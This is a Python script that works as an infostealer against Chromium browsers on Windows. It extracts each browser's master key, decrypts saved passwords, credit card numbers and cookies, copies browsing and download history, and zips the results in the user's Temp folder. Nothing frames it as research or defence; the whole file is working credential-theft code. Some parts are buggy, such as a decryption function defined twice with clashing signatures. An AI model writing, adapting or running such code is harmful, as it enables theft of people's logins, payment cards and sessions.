import os, requests, json, base64, sqlite3, shutil
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
from datetime import datetime

appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")

browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key
def extract_and_format_cookies(browser_path, master_key):
    cookies = []
    conn = None
    try:
        if not os.path.exists(browser_path):
            print(f"Database file does not exist: {browser_path}")
            return cookies

        conn = sqlite3.connect(browser_path)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies")
        for row in cursor.fetchall():
            try:
                encrypted_value = row[3]
                if encrypted_value:
                    decrypted_value = decrypt_password(encrypted_value, master_key)
                    if decrypted_value:
                        cookies.append({
                            'host_key': row[0],
                            'name': row[1],
                            'path': row[2],
                            'value': decrypted_value
                        })
            except ValueError as e:
                print(f"Error decrypting cookie: {e}")
            except UnicodeDecodeError:
                print("Warning: Failed to decode decrypted value as UTF-8.")
    except sqlite3.OperationalError as e:
        print(f"SQLite error: {e}")
    finally:
        if conn:
            conn.close()
    return cookies

def decrypt_password(encrypted_password, master_key, iv):
    try:
        if not iv:
            raise ValueError("IV (nonce) cannot be empty")
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        return decrypted_password
    except ValueError as e:
        print(f"Error decrypting password: {e}")
        return None
    except UnicodeDecodeError:
        print("Warning: Failed to decode decrypted value as UTF-8.")
        return None
def save_cookies(formatted_cookies, browser_name):
    output_dir = user + '\\AppData\\Local\\Temp\\Browser\\' + browser_name
    output_file = os.path.join(output_dir, 'cookies.txt')
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    with open(output_file, 'w', encoding='utf-8') as f:
        for cookie in formatted_cookies:
            f.write(cookie)

def decrypt_password(encrypted_password, master_key):
    try:
        iv = encrypted_password[3:15]
        if not iv:
            raise ValueError("IV is empty")
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        return decrypted_password
    except ValueError as e:
        print(f"Error decrypting password: {e}")
        return None
    except UnicodeDecodeError:
        print("Warning: Failed to decode decrypted value as UTF-8.")
        return None

def save_results(browser_name, data_type, content):
    if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
        os.mkdir(user+'\\AppData\\Local\\Temp\\Browser')
    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}'):
        os.mkdir(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}')
    if content is not None:
        open(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt', 'w', encoding="utf-8").write(content)

def get_login_data(path: str, profile: str, master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy(login_db, user+'\\AppData\\Local\\Temp\\login_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\login_db')
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
        URL: {row[0]}
        Email: {row[1]}
        Password: {password}
        
        """
    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\login_db')
    return result

def get_credit_cards(path: str, profile: str, master_key):
    cards_db = f'{path}\\{profile}\\Web Data'
    if not os.path.exists(cards_db):
        return

    result = ""
    shutil.copy(cards_db, user+'\\AppData\\Local\\Temp\\cards_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cards_db')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        result += f"""
        Name Card: {row[0]}
        Card Number: {card_number}
        Expires:  {row[1]} / {row[2]}
        Added: {datetime.fromtimestamp(row[4])}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\cards_db')
    return result

def get_web_history(path: str, profile: str):
    web_history_db = f'{path}\\{profile}\\History'
    result = ""
    if not os.path.exists(web_history_db):
        return

    shutil.copy(web_history_db, user+'\\AppData\\Local\\Temp\\web_history_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\web_history_db')
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue
        result += f"""
        URL: {row[0]}
        Title: {row[1]}
        Visited Time: {row[2]}
        
        """
    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\web_history_db')
    return result

def get_downloads(path: str, profile: str):
    downloads_db = f'{path}\\{profile}\\History'
    if not os.path.exists(downloads_db):
        return
    result = ""
    shutil.copy(downloads_db, user+'\\AppData\\Local\\Temp\\downloads_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\downloads_db')
    cursor = conn.cursor()
    cursor.execute('SELECT tab_url, target_path FROM downloads')
    for row in cursor.fetchall():
        if not row[0] or not row[1]:
            continue
        result += f"""
        Download URL: {row[0]}
        Local Path: {row[1]}
        
        """
    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\downloads_db')

def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results

def mainpass():
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
        save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
        save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
        save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))

        cookies = extract_and_format_cookies(browser_path, master_key)
        if cookies:
            save_cookies(cookies, browser)

    shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')

mainpass()
